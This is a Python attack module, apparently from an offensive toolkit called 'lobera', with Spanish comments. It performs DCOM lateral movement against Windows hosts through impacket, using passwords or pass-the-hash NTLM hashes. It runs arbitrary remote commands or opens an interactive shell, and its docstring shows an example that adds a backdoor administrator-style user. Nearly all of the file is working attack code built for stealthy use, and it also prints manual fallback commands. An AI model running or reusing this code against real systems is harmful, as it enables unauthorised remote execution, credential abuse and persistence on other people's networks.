# scripts/smb/attack/dcom_exec.py
"""
DCOM lateral movement — ejecución remota vía MMC20.Application, ShellWindows,
ShellBrowserWindow. Más silencioso que PSExec/SMBExec ya que no crea servicios.

Uso:
  python lobera.py smb -t 10.10.10.5 --script=dcom-exec -u Administrator -p Password --exec "whoami"
  python lobera.py smb -t 10.10.10.5 --script=dcom-exec -u Administrator -H :HASH --exec "net user hacker P@ss /add"
  python lobera.py smb -t 10.10.10.5 --script=dcom-exec -u Administrator -p Password --object ShellWindows

Objetos DCOM disponibles:
  MMC20     — MMC20.Application (más común, puerto 135)
  ShellWindows     — Shell.Application via ShellWindows
  ShellBrowserWindow — Shell.Application via ShellBrowserWindow

Requiere: impacket (dcomexec)
"""

from core.output import console, print_result
from core import session_db


DCOM_OBJECTS = {
    'MMC20':              '49B2791A-B1AE-4C90-9B8E-E860BA07F889',
    'ShellWindows':       '9BA05972-F6A8-11CF-A442-00A0C90A8F39',
    'ShellBrowserWindow': 'C08AFD90-F2A1-11D1-8455-00A0C91F3880',
}


class Script:
    NAME        = "dcom-exec"
    DESCRIPTION = "Lateral movement vía DCOM (MMC20/ShellWindows) — sin servicios"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        target  = str(self.target.ip)
        user    = getattr(args, 'username', None) or (self.creds.username if self.creds else None)
        password= getattr(args, 'password', '') or (self.creds.password if self.creds else '')
        domain  = getattr(args, 'domain',   '') or (self.creds.domain   if self.creds else '')
        hash_   = getattr(args, 'hash',     None)
        cmd     = getattr(args, 'exec',     'whoami')
        obj     = getattr(args, 'object',   'MMC20')
        shell   = getattr(args, 'shell',    False)

        if not user:
            console.print("[red]Falta -u USER[/red]")
            return

        lm_hash = nt_hash = ''
        if hash_:
            parts = hash_.split(':')
            lm_hash = parts[0] if len(parts) > 1 else 'aad3b435b51404eeaad3b435b51404ee'
            nt_hash = parts[-1]

        obj_key = obj.upper().replace('-', '').replace('_', '')
        if obj_key not in DCOM_OBJECTS:
            obj_key = 'MMC20'

        console.print(f"  [bold]DCOM Exec[/bold] → {domain}\\{user}@{target}")
        console.print(f"  Objeto: [cyan]{obj_key}[/cyan]  Comando: [yellow]{cmd}[/yellow]")

        try:
            from impacket.examples.dcomexec import DCOMEXEC

            e = DCOMEXEC(
                cmd if not shell else 'cmd.exe',
                user, password, domain,
                lm_hash, nt_hash,
                target, obj_key,
                None, None,
                shell_type='cmd' if shell else None,
                silentCommand=not shell,
            )

            if shell:
                console.print("  [bold green]Shell DCOM interactiva[/bold green] (escribe 'exit' para salir)")
                e.run(target)
            else:
                output = e.run(target)
                if output:
                    console.print(f"\n  [bold green]Output:[/bold green]")
                    for line in output.strip().splitlines():
                        console.print(f"    {line}")

            session_db.save_finding(
                category="dcom_exec",
                data={"target": target, "user": user, "domain": domain,
                      "object": obj_key, "cmd": cmd}
            )

        except ImportError:
            console.print("  [yellow]dcomexec de impacket no disponible en esta versión[/yellow]")
            self._manual_dcom(target, domain, user, password, lm_hash, nt_hash, cmd, obj_key)
        except Exception as e:
            console.print(f"  [red]Error DCOM: {e}[/red]")
            self._manual_dcom(target, domain, user, password, lm_hash, nt_hash, cmd, obj_key)

    def _manual_dcom(self, target, domain, user, password, lm_hash, nt_hash, cmd, obj):
        """Fallback manual con dcomexec.py de impacket"""
        cred = f"-hashes {lm_hash}:{nt_hash}" if nt_hash else f"-p {password}"
        console.print("\n  [yellow]Alternativa manual:[/yellow]")
        console.print(f"    [cyan]dcomexec.py {cred} -object {obj} {domain}/{user}@{target} '{cmd}'[/cyan]")
